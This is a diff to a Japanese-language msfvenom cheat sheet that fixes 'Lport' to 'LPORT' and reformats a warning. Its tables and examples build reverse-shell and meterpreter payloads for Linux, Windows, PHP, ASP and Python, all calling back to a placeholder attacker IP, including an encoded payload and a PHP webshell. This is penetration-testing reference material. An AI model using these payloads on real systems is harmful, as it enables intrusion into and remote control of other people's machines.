@@ -15,7 +15,7 @@
 | パラメタ     | 説明                                                                                     |
 | -------- | -------------------------------------------------------------------------------------- |
 | LHOST    | リスナー（待ち受け）を起動する側のIPアドレス。ローカルネットワークならLAN IP、インターネット越しならグローバルIP（WAN）を指定。                 |
-| Lport    | リスナーが接続を受け付けるポート番号。任意の空いているポートを指定可能。                                                   |
+| LPORT    | リスナーが接続を受け付けるポート番号。任意の空いているポートを指定可能。                                                   |
 | RHOST    | 攻撃対象（ターゲット）マシンのIPアドレス。                                                                 |
 | Rport    | 攻撃対象マシンでサービスが動作しているポート番号。多くのExploitやスキャナではあらかじめ設定済みのことが多い。                             |
 | SRVHOST  | 攻撃を仕掛ける側（自分の）マシンのIPアドレス。HTTPサーバーなどでファイル提供する場合などに使用。                                    |
@@ -43,7 +43,7 @@ msfvenom -p <payload> -f <format> -e <encoder> -o <output_file>
 
 例：
 ```zsh
-sudo msfvenom -p linux/x86/shell/reverse_tcp -f c -e x86/shikata_ga_nai -o shell.c LHOST=<attacker_IP> Lport=<port>
+sudo msfvenom -p linux/x86/shell/reverse_tcp -f c -e x86/shikata_ga_nai -o shell.c LHOST=<attacker_IP> LPORT=<port>
 ```
 
 | オプション | 意味                                                                                 |
@@ -87,7 +87,7 @@ msfvenom --list encoders
 
 例：PHPペイロードを Base64 でエンコード
 ```zsh
-msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_IP> Lport=<port> -f raw -e php/base64
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f raw -e php/base64
 ```
 
 ---
@@ -96,17 +96,17 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_IP> Lport=<port> -f raw 
 
 | ターゲット         | コマンド例                                                                                                       | 備考                   |
 | ------------- | ----------------------------------------------------------------------------------------------------------- | -------------------- |
-| Linux (x86)   | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_IP> Lport=<port> -f elf -o rev_shell.elf`     | ELF形式                |
-| Windows (x86) | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> Lport=<port> -f exe -o rev_shell.exe`       | exe形式                |
-| Windows (x64) | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_IP> Lport=<port> -f exe -o rev_shell64.exe` | 明示的にx64を指定           |
-| PHP           | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_IP> Lport=<port> -f raw -o rev_shell.php`           | Webシェルとして利用可能        |
-| ASP           | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> Lport=<port> -f asp -o rev_shell.asp`       | WebサーバがWindowsの場合に使用 |
-| Python        | `msfvenom -p cmd/unix/reverse_python LHOST=<attacker_IP> Lport=<port> -f raw -o rev_shell.py`                | UNIX系ターゲット用          |
+| Linux (x86)   | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f elf -o rev_shell.elf`     | ELF形式                |
+| Windows (x86) | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f exe -o rev_shell.exe`       | exe形式                |
+| Windows (x64) | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f exe -o rev_shell64.exe` | 明示的にx64を指定           |
+| PHP           | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f raw -o rev_shell.php`           | Webシェルとして利用可能        |
+| ASP           | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f asp -o rev_shell.asp`       | WebサーバがWindowsの場合に使用 |
+| Python        | `msfvenom -p cmd/unix/reverse_python LHOST=<attacker_IP> LPORT=<port> -f raw -o rev_shell.py`                | UNIX系ターゲット用          |
 
 ---
 
-# 🚨注意点
-
-- 出力されたコードの一部に問題がある場合があるので検証すること（例：PHPで `<?php` がコメントアウトされているなど）
-- 常に内容を確認し、必要があれば手動で修正すること
+> [!WARNING]
+> - 出力されたコードの一部に問題がある場合があるので検証すること（例：PHPで `<?php` がコメントアウトされているなど）
+> - 常に内容を確認し、必要があれば手動で修正すること
+- 
 - `uname -a` でターゲットマシンの OS・アーキテクチャを確認し、それに適したペイロードを選ぶこと
